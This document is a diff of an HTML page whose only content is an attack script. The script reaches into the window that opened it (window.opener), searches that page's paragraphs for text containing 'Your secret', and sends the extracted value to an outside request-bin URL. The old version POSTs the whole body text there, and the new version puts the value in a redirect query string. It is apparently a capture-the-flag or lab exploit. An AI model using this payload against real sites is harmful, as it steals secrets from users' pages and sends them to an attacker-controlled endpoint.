@@ -1,20 +1,27 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      try {
-        const secret =
-          window.opener?.document?.body?.innerText || // fallback if no id/class
-          "No secret found";
+<body>
+<script>
+  try {
+    // Get all <p> elements
+    const paragraphs = window.opener?.document?.getElementsByTagName("p");
 
-        // Send secret to your server or webhook
-        fetch("http://requestbin.whapi.cloud/1hpy4o61", {
-          method: "POST",
-          body: secret
-        });
-      } catch (e) {
-        alert("Error: " + e.message);
+    let secret = "No secret found";
+
+    // Loop through <p> tags to find the one that contains the word 'Your secret'
+    for (const p of paragraphs) {
+      if (p.innerText.includes("Your secret")) {
+        // Extract the text after the colon
+        secret = p.innerText.split(":")[1].trim();
+        break;
       }
-    </script>
-  </body>
+    }
+
+    // Send the secret to your server
+    window.location = `http://requestbin.whapi.cloud/1hpy4o61/?secret=${encodeURIComponent(secret)}`;
+  } catch (e) {
+    alert("Error: " + e.message);
+  }
+</script>
+</body>
 </html>
